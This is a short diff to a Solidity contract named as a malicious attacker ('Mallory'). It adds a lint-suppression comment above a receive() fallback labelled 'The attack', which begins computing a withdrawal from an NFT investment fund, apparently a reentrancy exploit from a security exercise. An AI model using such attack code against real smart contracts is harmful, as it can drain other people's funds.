@@ -17,6 +17,7 @@ contract MallorysMaliciousMisappropriation is Ownable {
 	}
 
 	// Receive is called when the contract receives Ether
+	// solhint-disable-next-line no-complex-fallback
 	receive() external payable {
 		// The attack
 		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) * tokenCount;
